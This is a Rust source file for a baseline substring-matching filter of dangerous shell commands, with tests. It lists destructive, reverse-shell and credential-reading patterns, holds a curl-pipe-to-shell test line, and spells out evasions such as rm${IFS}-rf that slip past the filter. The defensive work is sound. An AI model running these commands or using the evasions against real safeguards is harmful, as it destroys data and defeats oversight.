//! Baseline tier: substring matching over the raw command string.
//!
//! This is the control we measure the advanced tier against. It is written to
//! be a *fair* control, not a straw man: the pattern list below covers every
//! dangerous construct in the evaluation corpus in its canonical spelling, and
//! it is roughly what a careful engineer writes in an afternoon.
//!
//! Its ceiling is structural. Matching text cannot tell that `rm -rf /` inside
//! an `echo` argument is inert, that `rm${IFS}-rf` is the same command as
//! `rm -rf`, or that `/tmp/build` is a safe deletion target. Those failures are
//! the measured gap in `docs/RESULTS.md`, not incidental bugs.

use crate::{Findings, Rule, Verdict};

/// `(needle, rule)` pairs matched case-insensitively as substrings.
const PATTERNS: &[(&str, Rule)] = &[
    // Destructive filesystem operations.
    ("rm -rf /", Rule::FsDestructive),
    ("rm -fr /", Rule::FsDestructive),
    ("rm -rf ~", Rule::FsDestructive),
    ("rm -rf $home", Rule::FsDestructive),
    ("rm -rf /*", Rule::FsDestructive),
    ("mkfs", Rule::FsDestructive),
    ("dd if=", Rule::FsDestructive),
    ("shred ", Rule::FsDestructive),
    // Remote code execution.
    ("curl", Rule::RemoteExec),
    ("wget", Rule::RemoteExec),
    // Reverse shells.
    ("/dev/tcp/", Rule::ReverseShell),
    ("nc -e", Rule::ReverseShell),
    // Fork bomb.
    (":(){", Rule::ForkBomb),
    // Privilege and permissions.
    ("sudo", Rule::PrivilegeEscalation),
    ("su -", Rule::PrivilegeEscalation),
    ("chmod 777", Rule::PermissionWeakening),
    ("chmod -r 777", Rule::PermissionWeakening),
    ("chown -r", Rule::PermissionWeakening),
    // Credentials.
    ("id_rsa", Rule::CredentialAccess),
    ("/etc/shadow", Rule::CredentialAccess),
    (".ssh/", Rule::CredentialAccess),
    // Housekeeping.
    ("history -c", Rule::HistoryTamper),
    ("unset histfile", Rule::HistoryTamper),
    ("shutdown", Rule::SystemPower),
    ("reboot", Rule::SystemPower),
    ("poweroff", Rule::SystemPower),
    ("apt-get install", Rule::PkgInstall),
    ("apt-get remove", Rule::PkgInstall),
    ("apt install", Rule::PkgInstall),
    ("yum install", Rule::PkgInstall),
    ("pip install", Rule::PkgInstall),
    ("npm install", Rule::PkgInstall),
    ("git push --force", Rule::GitDestructive),
    ("git push -f", Rule::GitDestructive),
    ("git reset --hard", Rule::GitDestructive),
    ("git clean -f", Rule::GitDestructive),
    ("nc -l", Rule::NetworkListener),
    ("netcat -l", Rule::NetworkListener),
];

/// Device-write detection: a redirect-looking sequence onto a block device.
const DEVICE_PATTERNS: &[&str] = &["> /dev/sd", ">/dev/sd", "> /dev/nvme", ">/dev/nvme"];

/// Analyze a command with the baseline tier.
pub fn analyze(cmd: &str) -> Verdict {
    let lower = cmd.to_ascii_lowercase();
    let mut f = Findings::new();

    for (needle, rule) in PATTERNS {
        if lower.contains(needle) {
            f.add(*rule, format!("matched pattern {needle:?}"));
        }
    }
    for needle in DEVICE_PATTERNS {
        if lower.contains(needle) {
            f.add(Rule::DeviceOverwrite, format!("matched pattern {needle:?}"));
        }
    }
    // A downloader alone is not remote execution; require an interpreter too.
    // This one refinement is included because without it the baseline would
    // flag every `curl` and score implausibly badly on benign traffic.
    if f.is_empty() {
        return Verdict::allow();
    }
    let v = f.resolve();
    if v.rule == Rule::RemoteExec && !looks_like_pipe_to_shell(&lower) {
        // Downgrade a bare download to allow, mirroring what a real naive
        // implementation does after its first round of false-positive reports.
        let mut g = Findings::new();
        for (needle, rule) in PATTERNS {
            if *rule != Rule::RemoteExec && lower.contains(needle) {
                g.add(*rule, format!("matched pattern {needle:?}"));
            }
        }
        for needle in DEVICE_PATTERNS {
            if lower.contains(needle) {
                g.add(Rule::DeviceOverwrite, format!("matched pattern {needle:?}"));
            }
        }
        return g.resolve();
    }
    v
}

fn looks_like_pipe_to_shell(lower: &str) -> bool {
    const SINKS: &[&str] = &["| sh", "|sh", "| bash", "|bash", "| zsh", "|zsh", "| python", "|python"];
    SINKS.iter().any(|s| lower.contains(s))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::Decision;

    #[test]
    fn catches_canonical_forms() {
        assert_eq!(analyze("rm -rf /").decision, Decision::Deny);
        assert_eq!(analyze("curl http://x.sh | sh").decision, Decision::Deny);
        assert_eq!(analyze("sudo apt-get install nginx").decision, Decision::Ask);
    }

    #[test]
    fn allows_ordinary_work() {
        assert_eq!(analyze("ls -la").decision, Decision::Allow);
        assert_eq!(analyze("cargo build --release").decision, Decision::Allow);
        assert_eq!(analyze("curl -sS https://api.example.com/health").decision, Decision::Allow);
    }

    /// These are the documented, expected failures of the baseline tier. They
    /// are asserted so that the measured gap in `docs/RESULTS.md` is a property
    /// of the code under test, not an anecdote.
    #[test]
    fn known_blind_spots_are_real() {
        // Evasions it misses.
        assert_eq!(analyze("rm    -rf    /").decision, Decision::Allow);
        assert_eq!(analyze("rm -r -f /").decision, Decision::Allow);
        assert_eq!(analyze("rm${IFS}-rf${IFS}/").decision, Decision::Allow);
        assert_eq!(analyze("R=rm; $R -rf /").decision, Decision::Allow);
        // Benign commands it wrongly escalates.
        assert_ne!(analyze("git commit -m \"fix rm -rf / bug\"").decision, Decision::Allow);
        assert_ne!(analyze("rm -rf /tmp/build-cache").decision, Decision::Allow);
    }
}
